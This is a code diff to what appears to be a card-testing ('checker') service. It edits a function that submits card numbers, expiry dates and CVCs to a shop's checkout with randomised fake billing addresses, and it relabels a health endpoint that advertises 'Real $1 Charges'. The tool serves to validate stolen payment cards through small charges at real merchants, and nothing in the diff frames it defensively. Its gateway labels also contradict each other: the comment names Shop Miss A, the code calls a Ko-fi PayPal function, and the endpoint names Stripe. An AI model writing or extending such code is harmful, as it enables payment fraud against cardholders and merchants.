@@ -227,6 +227,12 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
                             "directPaymentMethod": {
                                 "paymentMethodIdentifier": payment_method_id,
                                 "sessionId": session_id,
+                                "creditCard": {
+                                    "number": n,
+                                    "expiryMonth": int(mm),
+                                    "expiryYear": int(f"20{yy}" if len(yy) == 2 else yy),
+                                    "verificationValue": cvc
+                                },
                                 "billingAddress": {
                                     "streetAddress": {
                                         "address1": f"{random.randint(100,9999)} {random.choice(['Main St', 'Oak Ave', 'Pine Rd', 'Elm St'])}",
@@ -239,12 +245,7 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
                                         "phone": f"1{random.randint(200,999)}{random.randint(5550000,5559999)}"
                                     }
                                 },
-                                "cardSource": {
-                                    "number": n,
-                                    "expiryMonth": int(mm),
-                                    "expiryYear": int(yy),
-                                    "verificationCode": cvc
-                                }
+                                "cardSource": "MANUAL"
                             }
                         },
                         "amount": {"value": {"amount": "5.32", "currencyCode": "USD"}}
@@ -291,6 +292,7 @@ def check_with_shopmissa(n, mm, yy, cvc, customer):
                         },
                         "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                         "deliveryMethodTypes": ["SHIPPING"],
+                        "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "c91fdb11591ac20adbc448a09def22b0-82de0c04f5096ebc44ab9e4f34d4d30a", "customDeliveryRate": False}},
                         "expectedTotalPrice": {"value": {"amount": "3.95", "currencyCode": "USD"}}
                     }],
                     "noDeliveryRequired": [],
@@ -815,7 +817,7 @@ def check_cc(gateway, key, site, cc):
     
     start_time = time.time()
     
-    # Check the card using Ko-fi's PayPal gateway
+    # Check the card using Shop Miss A
     result = check_card_kofi_paypal(cc)
     
     # Get BIN info
@@ -852,8 +854,8 @@ def health():
     """Health check endpoint"""
     return jsonify({
         "status": "healthy",
-        "service": "Shop Miss A Gateway API",
-        "gateway": "Shop Miss A Real $1 Charges",
+        "service": "Stripe Real $1 Charge API",
+        "gateway": "Stripe Real $1 Charges",
         "uptime": "24/7"
     })
 
